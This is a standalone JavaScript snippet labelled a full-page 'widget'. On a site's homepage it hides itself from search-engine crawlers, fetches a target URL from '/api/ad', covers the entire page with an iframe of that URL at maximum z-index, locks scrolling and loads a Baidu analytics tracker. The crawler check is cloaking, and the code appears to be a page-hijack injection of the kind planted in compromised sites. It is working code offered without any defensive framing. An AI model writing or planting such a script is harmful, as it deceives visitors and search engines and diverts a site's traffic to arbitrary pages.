(function () {
  'use strict';
  var key = '__newnewFullPageWidget';
  if (window[key]) return;
  if (window.location.pathname !== '/' && window.location.pathname !== '/index.html') return;
  if (/Baiduspider|Googlebot|bingbot|Slurp|DuckDuckBot|YandexBot|Sogou|Exabot|facebot|ia_archiver/i.test(navigator.userAgent)) return;

  var host, frame, controller, stopped = false;
  var previousOverflow, previousPriority;

  function loadAnalytics() {
    var id = '4cc85ee43827c904b6a85b75ca675e1a';
    var marker = '__baiduAnalytics_' + id;
    if (window[marker]) return;
    var scripts = document.querySelectorAll('script[src]');
    for (var i = 0; i < scripts.length; i++) {
      var url = new URL(scripts[i].src, document.baseURI);
      if (url.hostname === 'hm.baidu.com' && url.pathname === '/hm.js' && url.search === '?' + id) {
        window[marker] = true;
        return;
      }
    }
    window[marker] = true;
    window._hmt = window._hmt || [];
    var hm = document.createElement('script');
    hm.async = true;
    hm.src = 'https://hm.baidu.com/hm.js?4cc85ee43827c904b6a85b75ca675e1a';
    (document.head || document.documentElement).appendChild(hm);
  }

  async function resolveTarget() {
    controller = new AbortController();
    var timeout = setTimeout(function () { controller.abort(); }, 2500);
    try {
      var response = await fetch('/api/ad', { cache: 'no-store', credentials: 'same-origin', signal: controller.signal });
      if (!response.ok) throw new Error('Target request failed');
      var data = await response.json();
      var url = new URL(data.url);
      if (url.protocol !== 'https:' && url.protocol !== 'http:') throw new Error('Invalid target');
      return url.href;
    } catch (error) {
      return null;
    } finally {
      clearTimeout(timeout);
    }
  }

  async function mount() {
    if (stopped || host) return;
    var target = await resolveTarget();
    if (stopped) return;
    if (!target) {
      window[key].destroy();
      return;
    }
    host = document.createElement('div');
    host.id = 'newnew-full-page-widget';
    host.style.cssText = 'all:initial!important;display:block!important;position:fixed!important;inset:0!important;width:100%!important;height:100%!important;z-index:2147483647!important;background:#fff!important;';
    var shadow = host.attachShadow({ mode: 'open' });
    frame = document.createElement('iframe');
    frame.title = 'Embedded website';
    frame.style.cssText = 'display:block;width:100%;height:100%;border:0;background:#fff;';
    frame.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox allow-downloads allow-top-navigation-by-user-activation');
    frame.setAttribute('allow', 'fullscreen');
    frame.referrerPolicy = 'strict-origin-when-cross-origin';
    frame.src = target;
    shadow.appendChild(frame);
    previousOverflow = document.documentElement.style.getPropertyValue('overflow');
    previousPriority = document.documentElement.style.getPropertyPriority('overflow');
    document.documentElement.style.setProperty('overflow', 'hidden', 'important');
    document.documentElement.appendChild(host);
    loadAnalytics();
  }

  window[key] = {
    getCurrentUrl: function () { return frame ? frame.src : null; },
    destroy: function () {
      stopped = true;
      if (controller) controller.abort();
      document.removeEventListener('DOMContentLoaded', mount);
      if (host) {
        host.remove();
        if (previousOverflow) document.documentElement.style.setProperty('overflow', previousOverflow, previousPriority);
        else document.documentElement.style.removeProperty('overflow');
      }
      frame = null;
      host = null;
      delete window[key];
    }
  };
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', mount, { once: true });
  else mount();
})();
